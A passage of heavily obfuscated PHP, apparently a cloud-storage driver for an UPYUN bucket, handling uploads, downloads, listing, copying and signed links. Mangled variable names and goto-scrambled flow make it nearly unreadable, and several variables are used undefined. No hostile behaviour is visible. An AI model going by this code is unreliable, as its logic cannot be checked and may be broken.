(!$díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[683]] && isset($EŒÌ±¤”®[$cÃ”ÚÍÔ¸Ã[1223]])) { $EŒÌ±¤”® = $EŒÌ±¤”®[$cÃ”ÚÍÔ¸Ã[1223]]; } } } return array($cÃ”ÚÍÔ¸Ã[1017] => $díçÚÆò†È[$cÃ”ÚÍÔ¸Ã[683]], $cÃ”ÚÍÔ¸Ã[1019] => $EŒÌ±¤”®); goto AÛÏ«³ôÆ¨; e„…áß‡: $cÅ¾Òİ¾éë = $this->ussHeaders($fÙˆæĞ’Œ, $cô¸Éù¾·õ); if ($Eà‘†¥÷‚à) { $cÅ¾Òİ¾éë = array_merge($cÅ¾Òİ¾éë, $Eà‘†¥÷‚à); } $díçÚÆò†È = url_request($this->endpoint . $fÙˆæĞ’Œ, $cô¸Éù¾·õ, $EŒÌ±¤”®, $cÅ¾Òİ¾éë, $eˆ¦È‘ó‡‹); goto dâ¸Ø˜‰¸ù; AÛÏ«³ôÆ¨: } public function mkfile($e§«‹İëáä, $BÛğÖ¤À‘ = '', $E£‰ÇÉèğ = REPEAT_RENAME) { if ($this->setContent($e§«‹İëáä, $BÛğÖ¤À‘)) { return $this->getPathOuter($e§«‹İëáä); } return !1; } public function mkdir($f˜ïšÒ‚, $C¯„Øğ‚†Œ = REPEAT_SKIP) { $cİ ë¦‹øİ =& $_SERVER[Ä¿Ş°¨]; $cº£Ûùô  = trim($f˜ïšÒ‚, $cİ ë¦‹øİ[8]); if ($this->_isFolder($cº£Ûùô )) { return $this->getPathOuter($cº£Ûùô ); } $c½×¸­ ãØ = array($cİ ë¦‹øİ[1224]); $Eò«šæäÙ = $this->ussRequest($cº£Ûùô , $cİ ë¦‹øİ[208], !1, $c½×¸­ ãØ); return $Eò«šæäÙ[$cİ ë¦‹øİ[1017]] ? $this->getPathOuter($cº£Ûùô ) : !1; } public function copyFile($f¼Â‰¥ÀÁ, $d¦Ííï¹Ø¯) { $aÂİ®³Î ” =& $_SERVER[Ä¿Ş°¨]; $a±ùêê“ëË = array($aÂİ®³Î ”[1225] . "\57{$this->bucket}\57{$f¼Â‰¥ÀÁ}", $aÂİ®³Î ”[1226]); $dğ†ªÑ’¹Š = $this->ussRequest($d¦Ííï¹Ø¯, $aÂİ®³Î ”[210], !1, $a±ùêê“ëË); return $dğ†ªÑ’¹Š[$aÂİ®³Î ”[1017]] ? !0 : !1; } public function moveFile($E«ƒ×ã‚¬ö, $E‡íö³ŒêÆ) { $b¼¦¤‡®Õ =& $_SERVER[Ä¿Ş°¨]; $B‹®×ƒ¦À = array($b¼¦¤‡®Õ[1227] . "\57{$this->bucket}\x2f{$E«ƒ×ã‚¬ö}", $b¼¦¤‡®Õ[1226]); $CÖ·†Ş±ˆ´ = $this->ussRequest($E‡íö³ŒêÆ, $b¼¦¤‡®Õ[210], !1, $B‹®×ƒ¦À); return $CÖ·†Ş±ˆ´[$b¼¦¤‡®Õ[1017]] ? !0 : !1; } public function delFile($AªºÓÎÑ‘‚) { $DÜ­´ç¢« =& $_SERVER[Ä¿Ş°¨]; $FÁ£š†¨¨ã = $this->ussRequest($AªºÓÎÑ‘‚, $DÜ­´ç¢«[1228]); return $FÁ£š†¨¨ã[$DÜ­´ç¢«[1017]] ? !0 : !1; } public function delFolder($a¾”«òÉ›š) { $CõÃ´ÃÕœ =& $_SERVER[Ä¿Ş°¨]; $BÌİøœÇ = $this->listAll($a¾”«òÉ›š); krsort($BÌİøœÇ); foreach ($BÌİøœÇ as $C…†ìŠ›™œ) { $this->ussRequest($C…†ìŠ›™œ[$CõÃ´ÃÕœ[75]], $CõÃ´ÃÕœ[1228]); } return $this->ussRequest($a¾”«òÉ›š, $CõÃ´ÃÕœ[1228]); } public function rename($Aã“øÄÒÙ«, $a…„Ä‡Ş¶ß) { if ($this->isFile($Aã“øÄÒÙ«)) { $a…„Ä‡Ş¶ß = get_path_father($Aã“øÄÒÙ«) . $a…„Ä‡Ş¶ß; return $this->moveFile($Aã“øÄÒÙ«, $a…„Ä‡Ş¶ß); } return $this->renameObject($Aã“øÄÒÙ«, $a…„Ä‡Ş¶ß); } public function fileInfo($Fäòğ˜”óË, $Eìù½¾­“ã = false, $Eº¤õÖŞß = array()) { $cæ¹©ÔéøÖ =& $_SERVER[Ä¿Ş°¨]; if ($Eìù½¾­“ã) { return array($cæ¹©ÔéøÖ[28] => $this->pathThis($Fäòğ˜”óË), $cæ¹©ÔéøÖ[75] => $this->getPathOuter($cæ¹©ÔéøÖ[8] . $Fäòğ˜”óË), $cæ¹©ÔéøÖ[29] => $cæ¹©ÔéøÖ[163], $cæ¹©ÔéøÖ[77] => isset($Eº¤õÖŞß[$cæ¹©ÔéøÖ[321]]) ? $Eº¤õÖŞß[$cæ¹©ÔéøÖ[321]] : 0, $cæ¹©ÔéøÖ[156] => $this->ext($Fäòğ˜”óË)); } $BÔ°©“È‘š = array($cæ¹©ÔéøÖ[28] => $this->pathThis($Fäòğ˜”óË), $cæ¹©ÔéøÖ[75] => $this->getPathOuter($cæ¹©ÔéøÖ[8] . $Fäòğ˜”óË), $cæ¹©ÔéøÖ[29] => $cæ¹©ÔéøÖ[163], $cæ¹©ÔéøÖ[183] => 0, $cæ¹©ÔéøÖ[106] => isset($C›ÙÊ›ˆËà[$cæ¹©ÔéøÖ[1229]]) ? $C›ÙÊ›ˆËà[$cæ¹©ÔéøÖ[1229]] : 0, $cæ¹©ÔéøÖ[77] => isset($Eº¤õÖŞß[$cæ¹©ÔéøÖ[321]]) ? $Eº¤õÖŞß[$cæ¹©ÔéøÖ[321]] : 0, $cæ¹©ÔéøÖ[156] => $this->ext($Fäòğ˜”óË), $cæ¹©ÔéøÖ[184] => !0, $cæ¹©ÔéøÖ[185] => !0); if (empty($Eº¤õÖŞß)) { $Eº¤õÖŞß = $this->objectMeta($Fäòğ˜”óË); if (!$Eº¤õÖŞß) { return $BÔ°©“È‘š; } $BÔ°©“È‘š[$cæ¹©ÔéøÖ[183]] = $Eº¤õÖŞß[$cæ¹©ÔéøÖ[1230]]; $BÔ°©“È‘š[$cæ¹©ÔéøÖ[106]] = $Eº¤õÖŞß[$cæ¹©ÔéøÖ[1231]]; $BÔ°©“È‘š[$cæ¹©ÔéøÖ[77]] = $Eº¤õÖŞß[$cæ¹©ÔéøÖ[77]]; } return $BÔ°©“È‘š; } public function folderInfo($D¬›¯ç… , $aÆ¥í ê“ä = false) { $BğœÌ˜¡Œ =& $_SERVER[Ä¿Ş°¨]; if ($aÆ¥í ê“ä) { return array($BğœÌ˜¡Œ[28] => $this->pathThis($D¬›¯ç… ), $BğœÌ˜¡Œ[75] => $this->getPathOuter($BğœÌ˜¡Œ[8] . $D¬›¯ç… ), $BğœÌ˜¡Œ[29] => $BğœÌ˜¡Œ[76]); } $A±™£Ïµ¸Ó = array($BğœÌ˜¡Œ[28] => $this->pathThis($D¬›¯ç… ), $BğœÌ˜¡Œ[75] => $this->getPathOuter($BğœÌ˜¡Œ[8] . $D¬›¯ç… ), $BğœÌ˜¡Œ[29] => $BğœÌ˜¡Œ[76], $BğœÌ˜¡Œ[183] => 0, $BğœÌ˜¡Œ[106] => isset($FÃƒåñ‰™[$BğœÌ˜¡Œ[1229]]) ? $FÃƒåñ‰™[$BğœÌ˜¡Œ[1229]] : 0, $BğœÌ˜¡Œ[1139] => !0, $BğœÌ˜¡Œ[1140] => !0); if (empty($E‹›˜Š°÷)) { $E‹›˜Š°÷ = $this->objectMeta($D¬›¯ç… ); if (!$E‹›˜Š°÷) { return $A±™£Ïµ¸Ó; } $A±™£Ïµ¸Ó[$BğœÌ˜¡Œ[183]] = $E‹›˜Š°÷[$BğœÌ˜¡Œ[1230]]; $A±™£Ïµ¸Ó[$BğœÌ˜¡Œ[106]] = $E‹›˜Š°÷[$BğœÌ˜¡Œ[1231]]; } return $A±™£Ïµ¸Ó; } private function fileList($cÜµÄ“¯, $CÖÎÒ©© = 0, $Fƒèå³‚‡² = 1000) { $bË·”¯ˆ¯Ú =& $_SERVER[Ä¿Ş°¨]; $BÕÆİšêÊ¾ = array($bË·”¯ˆ¯Ú[1232], $bË·”¯ˆ¯Ú[1233] . $Fƒèå³‚‡²); if ($CÖÎÒ©©) { $BÕÆİšêÊ¾[] = $bË·”¯ˆ¯Ú[1234] . $CÖÎÒ©©; } $b©Ûƒ—É¡ = $this->ussRequest($cÜµÄ“¯, $bË·”¯ˆ¯Ú[212], !1, $BÕÆİšêÊ¾); return !$b©Ûƒ—É¡[$bË·”¯ˆ¯Ú[1017]] ? !1 : $b©Ûƒ—É¡[$bË·”¯ˆ¯Ú[1019]]; } public function listPath($A Š¯ŸËõÉ, $B‹÷¶©Ş‚ = false) { goto a©ÄƒïÅÚ×; D¤ŞíåÍ: return array($Fî¶§öºÁ÷[74] => $bãòİ·¢Ö, $Fî¶§öºÁ÷[73] => $DâŸî¦à³ù); goto d‰æğÜ¹Ô´; a©ÄƒïÅÚ×: $Fî¶§öºÁ÷ =& $_SERVER[Ä¿Ş°¨]; $d²â„‹¹Ë = $Fî¶§öºÁ÷[33]; $CÚô¢ñÑÁé = 1000; goto d…Ñ‚Ö´Í…; d…Ñ‚Ö´Í…: $bãòİ·¢Ö = $DâŸî¦à³ù = array(); $d¯¨†äï š = rtrim($A Š¯ŸËõÉ, $Fî¶§öºÁ÷[8]) . $Fî¶§öºÁ÷[8]; while (!0) { $C‘×“õ‡‘ = $this->fileList($A Š¯ŸËõÉ, $d²â„‹¹Ë, $CÚô¢ñÑÁé); if (!$C‘×“õ‡‘) { return !1; } $d²â„‹¹Ë = isset($C‘×“õ‡‘[$Fî¶§öºÁ÷[1235]]) ? $C‘×“õ‡‘[$Fî¶§öºÁ÷[1235]] : $Fî¶§öºÁ÷[33]; $bºµ®ÈÀ‹Ô = isset($C‘×“õ‡‘[$Fî¶§öºÁ÷[1236]]) ? $C‘×“õ‡‘[$Fî¶§öºÁ÷[1236]] : array(); foreach ($bºµ®ÈÀ‹Ô as $b°µô•ì) { if ($b°µô•ì[$Fî¶§öºÁ÷[29]] == $Fî¶§öºÁ÷[76]) { $bãòİ·¢Ö[] = $this->folderInfo($d¯¨†äï š . $b°µô•ì[$Fî¶§öºÁ÷[28]], $B‹÷¶©Ş‚, $b°µô•ì); } else { $DâŸî¦à³ù[] = $this->fileInfo($d¯¨†äï š . $b°µô•ì[$Fî¶§öºÁ÷[28]], $B‹÷¶©Ş‚, $b°µô•ì); } } if (count($bºµ®ÈÀ‹Ô) < $CÚô¢ñÑÁé) { break; } } goto D¤ŞíåÍ; d‰æğÜ¹Ô´: } private function recursionAllFiles($A¨‰½±ê˜‰, &$B†˜ŞØãã”) { $e¢Ü£¸°¤â =& $_SERVER[Ä¿Ş°¨]; $e·¯„¨²»ê = $e¢Ü£¸°¤â[33]; $AÜÏ×¡ÇÉ´ = 1000; $dËÓôÂøÕ = $dË—ñ…äòï = array(); $f®ÊœÑ®ë = rtrim($A¨‰½±ê˜‰, $e¢Ü£¸°¤â[8]) . $e¢Ü£¸°¤â[8]; while (!0) { $E…¾¥Œ˜Òç = $this->fileList($A¨‰½±ê˜‰, $e·¯„¨²»ê, $AÜÏ×¡ÇÉ´); if (!$E…¾¥Œ˜Òç) { return !1; } $e·¯„¨²»ê = isset($E…¾¥Œ˜Òç[$e¢Ü£¸°¤â[1235]]) ? $E…¾¥Œ˜Òç[$e¢Ü£¸°¤â[1235]] : $e¢Ü£¸°¤â[33]; $BêÊõ®¨”Ğ = isset($E…¾¥Œ˜Òç[$e¢Ü£¸°¤â[1236]]) ? $E…¾¥Œ˜Òç[$e¢Ü£¸°¤â[1236]] : array(); foreach ($BêÊõ®¨”Ğ as $dÓÄßàèÉ£) { $d¯œïò¨ = array($e¢Ü£¸°¤â[75] => $f®ÊœÑ®ë . $dÓÄßàèÉ£[$e¢Ü£¸°¤â[28]], $e¢Ü£¸°¤â[76] => $dÓÄßàèÉ£[$e¢Ü£¸°¤â[29]] == $e¢Ü£¸°¤â[76] ? 1 : 0, $e¢Ü£¸°¤â[77] => isset($dÓÄßàèÉ£[$e¢Ü£¸°¤â[321]]) ? $dÓÄßàèÉ£[$e¢Ü£¸°¤â[321]] : 0); $B†˜ŞØãã”[] = $d¯œïò¨; if ($d¯œïò¨[$e¢Ü£¸°¤â[76]] == 1) { $this->recursionAllFiles($d¯œïò¨[$e¢Ü£¸°¤â[75]], $B†˜ŞØãã”); } } if (count($BêÊõ®¨”Ğ) < $AÜÏ×¡ÇÉ´) { break; } } } public function has($e¿›ÉÓ‘ÇŞ, $dÄ¯ÍÂõ¦ = false, $cÉÀ¢ÃŒìß = true) { goto Aæ–ƒìùª; F ‹½Á¤: $Cì¯­ˆ§’ = 0; $F—×¸Ìå™ = 0; $B¬›“§ØæÀ = rtrim($e¿›ÉÓ‘ÇŞ, $D·ìéÚÊÀ[8]) . $D·ìéÚÊÀ[8]; goto cÚõİº°ù; Aæ–ƒìùª: $D·ìéÚÊÀ =& $_SERVER[Ä¿Ş°¨]; $c´Û°Îó³ = $D·ìéÚÊÀ[33]; $c–ÜÚ¼“âÍ = 1000; goto F ‹½Á¤; cÚõİº°ù: while (!0) { $C®¹İ†ë° = $this->fileList($e¿›ÉÓ‘ÇŞ, $c´Û°Îó³, $c–ÜÚ¼“âÍ); if (!$C®¹İ†ë°) { return !1; } $c´Û°Îó³ = isset($C®¹İ†ë°[$D·ìéÚÊÀ[1235]]) ? $C®¹İ†ë°[$D·ìéÚÊÀ[1235]] : $D·ìéÚÊÀ[33]; $b§ø„™ëÄ” = isset($C®¹İ†ë°[$D·ìéÚÊÀ[1236]]) ? $C®¹İ†ë°[$D·ìéÚÊÀ[1236]] : array(); if (empty($b§ø„™ëÄ”)) { break; } $BØë©‚§Ò› = array_to_keyvalue($b§ø„™ëÄ”, $D·ìéÚÊÀ[33], $D·ìéÚÊÀ[29]); $cÏßäÃÜÛ = array_count_values($BØë©‚§Ò›); $Eà«‹Š£îå = isset($cÏßäÃÜÛ[$D·ìéÚÊÀ[76]]) ? $cÏßäÃÜÛ[$D·ìéÚÊÀ[76]] : 0; $e„æêºá = count($BØë©‚§Ò›) - $Eà«‹Š£îå; if ($dÄ¯ÍÂõ¦) { $F—×¸Ìå™ += $Eà«‹Š£îå; $Cì¯­ˆ§’ += $e„æêºá; if ($F£ğ…ØİÃÏ < $c–ÜÚ¼“âÍ) { break; } continue; } if ($cÉÀ¢ÃŒìß) { if ($e„æêºá) { return !0; } } else { if ($Eà«‹Š£îå) { return !0; } } if (count($b§ø„™ëÄ”) < $c–ÜÚ¼“âÍ) { break; } } if ($dÄ¯ÍÂõ¦) { return array($D·ìéÚÊÀ[187] => $Cì¯­ˆ§’, $D·ìéÚÊÀ[188] => $F—×¸Ìå™); } return !1; goto D÷÷íâ­£÷; D÷÷íâ­£÷: } public function listAll($E‹Ñé¡Ã‡‹) { $Aö•ÒÍ¥Í = array(); $this->recursionAllFiles($E‹Ñé¡Ã‡‹, $Aö•ÒÍ¥Í); return $Aö•ÒÍ¥Í; } public function canRead($FÎØ×¯÷õ…) { return $this->exist($FÎØ×¯÷õ…) ? !0 : !1; } public function canWrite($B»áí²‰™¨) { return $this->exist($B»áí²‰™¨) ? !0 : !1; } public function getContent($F‡µöäµƒé) { return $this->fileSubstr($F‡µöäµƒé, 0, -1); } public function setContent($fÌ‚÷«ˆ“, $cÂ‘ÈêàöÄ = '') { $F¨ÉŠ´Á÷ =& $_SERVER[Ä¿Ş°¨]; if (!$cÂ‘ÈêàöÄ) { $c‰Ïã¼‹ = $this->ussRequest($fÌ‚÷«ˆ“, $F¨ÉŠ´Á÷[208]); return $c‰Ïã¼‹[$F¨ÉŠ´Á÷[1017]]; } $cÅĞìÀÄ™Ú = $this->tempFile($this->pathThis($fÌ‚÷«ˆ“)); file_put_contents($cÅĞìÀÄ™Ú, $cÂ‘ÈêàöÄ); if ($this->upload($fÌ‚÷«ˆ“, $cÅĞìÀÄ™Ú)) { $this->tempFileRemve($cÅĞìÀÄ™Ú); return !0; } return !1; } public function fileSubstr($C¡ğÄ¬éƒ, $a‘øìŒ‘ñ², $D½«Áª–) { $fÈÃ¸Š¯ª =& $_SERVER[Ä¿Ş°¨]; if (!($cËìµ²Š“Ñ = $this->link($C¡ğÄ¬éƒ))) { return !1; } $b„Ÿ©Û×¾å = !1; if ($D½«Áª– > 0) { $Fì…ôèÆİ = $a‘øìŒ‘ñ² + $D½«Áª– - 1; $b„Ÿ©Û×¾å = array($fÈÃ¸Š¯ª[1197] . $a‘øìŒ‘ñ² . $fÈÃ¸Š¯ª[416] . $Fì…ôèÆİ); } $f¼ÈÇĞ¯ = url_request($cËìµ²Š“Ñ, $fÈÃ¸Š¯ª[212], !1, $b„Ÿ©Û×¾å); return $f¼ÈÇĞ¯[$fÈÃ¸Š¯ª[683]] ? $f¼ÈÇĞ¯[$fÈÃ¸Š¯ª[1019]] : !1; } public function upload($D¥é¶êñÄ, $cß¡Ç‡å‹Ì, $c™÷Êßêê = false, $aùŠ†Ö»ßƒ = REPEAT_REPLACE) { goto cÛÛ®ãù; cÛÛ®ãù: $e¦Ùæ÷Ì¹¸ =& $_SERVER[Ä¿Ş°¨]; $E–÷ÉÔ‡Óİ = IO::size($cß¡Ç‡å‹Ì); if ($E–÷ÉÔ‡Óİ <= 1024 * 1024 * 200) { $f˜”Ï“æ° = array($e¦Ùæ÷Ì¹¸[1237] . $cß¡Ç‡å‹Ì); $e…ñÙİñ‡ = $this->ussRequest($D¥é¶êñÄ, $e¦Ùæ÷Ì¹¸[210], $f˜”Ï“æ°); return $e…ñÙİñ‡[$e¦Ùæ÷Ì¹¸[1017]] ? $this->getPathOuter($D¥é¶êñÄ) : !1; } goto a÷§ªåù›¾; a÷§ªåù›¾: $dî´ÒÇ–óê = 1024 * 1024 * 10; $F³¯¾â¯  = array($e¦Ùæ÷Ì¹¸[1238], $e¦Ùæ÷Ì¹¸[1239] . $E–÷ÉÔ‡Óİ, $e¦Ùæ÷Ì¹¸[1240], $e¦Ùæ÷Ì¹¸[1241] . $dî´ÒÇ–óê); $e…ñÙİñ‡ = $this->ussRequest($D¥é¶êñÄ, $e¦Ùæ÷Ì¹¸[210], !1, $F³¯¾â¯ ); goto d„”áÒç¶Œ; EÀë§Õôğï: do { $BÔ´¸ìŒà³ = $fœ›­Î§æ©[$e¦Ùæ÷Ì¹¸[1243]]; fseek($f§ˆö ÙŒ‘, $f˜‘öàİÌ); $e‘°İ§ßŒ = fread($f§ˆö ÙŒ‘, $BÔ´¸ìŒà³); $fŠ§ÍÄ÷ÒÒ = 0; do { $fŠ§ÍÄ÷ÒÒ++; $fœ›­Î§æ© = $this->uploadPart($D¥é¶êñÄ, $fœ›­Î§æ©, $e‘°İ§ßŒ); } while (!$fœ›­Î§æ© && $fŠ§ÍÄ÷ÒÒ < 3); if (!$fœ›­Î§æ©) { return !1; } $cè®Š‹—ÚÜ = $fœ›­Î§æ©[$e¦Ùæ÷Ì¹¸[1242]]; $f˜‘öàİÌ += $BÔ´¸ìŒà³; } while ($cè®Š‹—ÚÜ != -1); fclose($f§ˆö ÙŒ‘); $F³¯¾â¯  = array($e¦Ùæ÷Ì¹¸[1244], $e¦Ùæ÷Ì¹¸[1245] . $fœ›­Î§æ©[$e¦Ùæ÷Ì¹¸[1246]], $e¦Ùæ÷Ì¹¸[1240]); goto DáâÔ½Ğ•; aÖ’²™±»Ê: $cè®Š‹—ÚÜ = $fœ›­Î§æ©[$e¦Ùæ÷Ì¹¸[1242]]; $f§ˆö ÙŒ‘ = fopen($cß¡Ç‡å‹Ì, $e¦Ùæ÷Ì¹¸[1147]); if (!$f§ˆö ÙŒ‘) { return !1; } goto EÀë§Õôğï; d„”áÒç¶Œ: if (!$e…ñÙİñ‡[$e¦Ùæ÷Ì¹¸[1017]]) { return !1; } $fœ›­Î§æ© = $e…ñÙİñ‡[$e¦Ùæ÷Ì¹¸[1019]]; $f˜‘öàİÌ = 0; goto aÖ’²™±»Ê; DáâÔ½Ğ•: $e…ñÙİñ‡ = $this->ussRequest($D¥é¶êñÄ, $e¦Ùæ÷Ì¹¸[210], !1, $F³¯¾â¯ ); return $e…ñÙİñ‡[$e¦Ùæ÷Ì¹¸[1017]] ? $this->getPathOuter($EŒÏÄÛ¢ï) : !1; goto EÓœãœ¼£æ; EÓœãœ¼£æ: } private function uploadPart($fÏ÷ƒ¨Íó÷, $e‹ñ¿å¸œ, &$B‚ÁëĞ›ä) { $eÂÁİÔêö =& $_SERVER[Ä¿Ş°¨]; $eëš·šá‡ = array($eÂÁİÔêö[1247], $eÂÁİÔêö[1245] . $e‹ñ¿å¸œ[$eÂÁİÔêö[1246]], $eÂÁİÔêö[1248] . $e‹ñ¿å¸œ[$eÂÁİÔêö[1242]], $eÂÁİÔêö[1249] . $e‹ñ¿å¸œ[$eÂÁİÔêö[1243]]); $cæ†¼¬í½Œ = $this->ussRequest($fÏ÷ƒ¨Íó÷, $eÂÁİÔêö[210], $B‚ÁëĞ›ä, $eëš·šá‡); return !$cæ†¼¬í½Œ[$eÂÁİÔêö[1017]] ? $cæ†¼¬í½Œ[$eÂÁİÔêö[1017]] : $cæ†¼¬í½Œ[$eÂÁİÔêö[1019]]; } public function uploadFormData($FæÑ”´‰”™, $F†ÍäÒ‹Ö = 3600) { return $this->uploadPolicy($FæÑ”´‰”™, $F†ÍäÒ‹Ö); } public function multiUploadFormData($dÑë¨Å¶ˆ‚, $fğ™åÀ°Ä = 3600) { $A‘Á Äò² =& $_SERVER[Ä¿Ş°¨]; $Eµ­ãóæ©ä = (int) $GLOBALS[$A‘Á Äò²[7]][$A‘Á Äò²[77]]; return $this->uploadPolicy($dÑë¨Å¶ˆ‚, $fğ™åÀ°Ä, $Eµ­ãóæ©ä); } private function uploadPolicy($d¡”ŠÅßåÜ, $c‘‘˜‡Íö = 3600, $e»½Ïæô“ = 0) { goto c²¬À…Ü¸¼; c²¬À…Ü¸¼: $açŠÑ±ğìˆ =& $_SERVER[Ä¿Ş°¨]; $e¸¡½¾Çìö = $açŠÑ±ğìˆ[8] . $this->bucket; $EŒìõÛ·éŸ = gmdate($açŠÑ±ğìˆ[1182]); goto A½ÇÂ¿‚Ã; E»ØÈ…Ôµ: $a¥ÔÍÃ·Ô = base64_encode(hash_hmac($açŠÑ±ğìˆ[1219], "\x50\x4f\x53\x54\x26{$e¸¡½¾Çìö}\x26{$EŒìõÛ·éŸ}\46{$aò‹±°»¹’}", md5("{$this->userpass}"), !0)); $Aˆ©—è‰ŞÅ = array($açŠÑ±ğìˆ[1090] => $aò‹±°»¹’, $açŠÑ±ğìˆ[1254] => "\125\120\131\x55\x4e\x20{$this->username}\x3a{$a¥ÔÍÃ·Ô}", $açŠÑ±ğìˆ[165] => $this->endpoint . $e¸¡½¾Çìö); return $Aˆ©—è‰ŞÅ; goto b†ƒ·Áá¥; A½ÇÂ¿‚Ã: $fóŞÃğË×› = array($açŠÑ±ğìˆ[1250] => $this->bucket, $açŠÑ±ğìˆ[1251] => $d¡”ŠÅßåÜ, $açŠÑ±ğìˆ[1252] => time() + $c‘‘˜‡Íö, $açŠÑ±ğìˆ[1253] => $EŒìõÛ·éŸ); if ($e»½Ïæô“) { $fóŞÃğË×›[$açŠÑ±ğìˆ[1168]] = $e»½Ïæô“; } $aò‹±°»¹’ = base64_encode(json_encode($fóŞÃğË×›)); goto E»ØÈ…Ôµ; b†ƒ·Áá¥: } public function download($A˜½×šŒÊÀ, $DõÖòçßáä) { goto Bˆã¸†œ†´; a¯í‚Ïˆå: $CåŸ·»æÚ = 1024 * 200; $FŒÚğ¸ùÆÉ = fopen($AŸ°ÅåºŞ, $_SERVER[Ä¿Ş°¨][1203]); while (!0) { $cêÌöôòª‰ = $this->fileSubstr($A˜½×šŒÊÀ, $aêËÙÁ‚‚ª, $CåŸ·»æÚ); if ($cêÌöôòª‰ === !1) { return !1; } fwrite($FŒÚğ¸ùÆÉ, $cêÌöôòª‰); $aêËÙÁ‚‚ª += $CåŸ·»æÚ; if (strlen($cêÌöôòª‰) < $CåŸ·»æÚ) { break; } } goto bğî¨ÍÜä; bğî¨ÍÜä: fclose($FŒÚğ¸ùÆÉ); return $DõÖòçßáä; goto BáÃõŠ×ìß; Bˆã¸†œ†´: $AŸ°ÅåºŞ = IO::getPathInner(IO::mkfile($DõÖòçßáä)); if (!($C”İ”‡ÈØ = $this->link($A˜½×šŒÊÀ))) { return !1; } $aêËÙÁ‚‚ª = 0; goto a¯í‚Ïˆå; BáÃõŠ×ìß: } public function link($cª‹í÷ù†Ç, $a¸‹á‘ø³ = array()) { $ağÊ°È…Ÿ =& $_SERVER[Ä¿Ş°¨]; $cª‹í÷ù†Ç = trim($cª‹í÷ù†Ç, $ağÊ°È…Ÿ[8]); if (!empty($this->token)) { $bÏ„¸±òŒ» = strtotime(date($ağÊ°È…Ÿ[1255])); $eÒŒ«ëŞÅÒ = substr(md5($this->token . $ağÊ°È…Ÿ[268] . $bÏ„¸±òŒ» . $ağÊ°È…Ÿ[1256] . $cª‹í÷ù†Ç), 12, 8) . $bÏ„¸±òŒ»; $a¸‹á‘ø³[] = $ağÊ°È…Ÿ[1257] . $eÒŒ«ëŞÅÒ; } $AìÔë¶³±½ = !empty($a¸‹á‘ø³) ? $ağÊ°È…Ÿ[69] . implode($ağÊ°È…Ÿ[268], $a¸‹á‘ø³) : $ağÊ°È…Ÿ[33]; return $this->getHost() . $ağÊ°È…Ÿ[8] . $cª‹í÷ù†Ç . $AìÔë¶³±½; } public function fileOut($D¬ƒ±„ì”, $cË³‚­Îâ² = false, $D‡¡×ğ­Ãï = false, $E‘ŸòêŒ°· = '') { if (!$D‡¡×ğ­Ãï) { $D‡¡×ğ­Ãï = $this->pathThis($D¬ƒ±„ì”); } $a„Ş†‰‹İ = $cË³‚­Îâ² ? array($_SERVER[Ä¿Ş°¨][1258] . rawurlencode($D‡¡×ğ­Ãï)) : array(); $d¶ôã™››¶ = $this->link($D¬ƒ±„ì”, $a„Ş†‰‹İ); $this->fileOutLink($d¶ôã™››¶); } public function fileOutServer($d‹¼Ó¦‡É, $EŠ²Î‘¨´œ = false, $bİÀåìù’é = false, $AÑ¸…ÄŒ¬ = '') { parent::fileOut($d‹¼Ó¦‡É, $EŠ²Î‘¨´œ, $bİÀåìù’é, $AÑ¸…ÄŒ¬); } public function fileOutImage($c†ÎİäÓÏ‡, $A¼ª‰ƒÏõ  = 250) { $c÷ÚçîË„ = $this->link($c†ÎİäÓÏ‡ . $_SERVER[Ä¿Ş°¨][1259] . $A¼ª‰ƒÏõ ); $this->fileOutLink($c÷ÚçîË„); } public function fileOutImageServer($e¹ÓÂä®ò, $aé’àåâ˜ê = 250) { parent::fileOutImage($e¹ÓÂä®ò, $aé’àåâ˜ê); } public function hashMd5($Cê”™ØŒòá) { $D”•ŞäÁ÷î =& $_SERVER[Ä¿Ş°¨]; $fÕğš¥™… = $this->objectMeta($Cê”™ØŒòá); return isset($fÕğš¥™…[$D”•ŞäÁ÷î[192]]) ? $fÕğš¥™…[$D”•ŞäÁ÷î[192]] : !1; } public function size($f½ˆåî˜Ó¶) { $B¸İéİä¥‚ = $this->objectMeta($f½ˆåî˜Ó¶); return $B¸İéİä¥‚ ? $B¸İéİä¥‚[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function info($AÜäöâ§ã´) { if ($this->isFolder($AÜäöâ§ã´)) { return $this->folderInfo($AÜäöâ§ã´); } else { if ($this->isFile($AÜäöâ§ã´)) { return $this->fileInfo($AÜäöâ§ã´); } } return !1; } public function exist($B‹¿šÓ·ì±) { return $this->isFile($B‹¿šÓ·ì±) || $this->isFolder($B‹¿šÓ·ì±); } public function isFile($eœÅª¹Á±©) { return !$this->isFolder($eœÅª¹Á±©) && $this->objectMeta($eœÅª¹Á±©); } public function isFolder($A¸ö­ÑÇº) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][219], $A¸ö­ÑÇº); } protected function objectMeta($BÀ¹‚ê¾Ãƒ) { return $this->cacheMethod($_SERVER[Ä¿Ş°¨][220], $BÀ¹‚ê¾Ãƒ); } protected function _objectMeta($AÉ—ÓÅ–°”) { goto fÏ‘âÌ¼áÔ; FÆ’àÇÍ: $AÂâà…Ÿ”» = array($A°Ğß‡¥¹[28] => get_path_this($AÉ—ÓÅ–°”), $A°Ğß‡¥¹[29] => isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1261]]) ? $föÂ­ŸÓê[$A°Ğß‡¥¹[1261]] : null, $A°Ğß‡¥¹[77] => isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1262]]) ? $föÂ­ŸÓê[$A°Ğß‡¥¹[1262]] : null, $A°Ğß‡¥¹[192] => isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1263]]) ? $föÂ­ŸÓê[$A°Ğß‡¥¹[1263]] : null, $A°Ğß‡¥¹[1230] => isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1264]]) ? $föÂ­ŸÓê[$A°Ğß‡¥¹[1264]] : null); $AÂâà…Ÿ”»[$A°Ğß‡¥¹[1231]] = isset($föÂ­ŸÓê[$A°Ğß‡¥¹[1265]]) ? strtotime($föÂ­ŸÓê[$A°Ğß‡¥¹[1265]]) : $AÂâà…Ÿ”»[$A°Ğß‡¥¹[1230]]; return $AÂâà…Ÿ”»; goto fàÔ„±¤‹¾; fÏ‘âÌ¼áÔ: $A°Ğß‡¥¹ =& $_SERVER[Ä¿Ş°¨]; if ($AÉ—ÓÅ–°” == $A°Ğß‡¥¹[33] || $AÉ—ÓÅ–°” == $A°Ğß‡¥¹[8]) { return array(); } $b¯¾ç‘Ü­Ë = $this->ussRequest($AÉ—ÓÅ–°”, 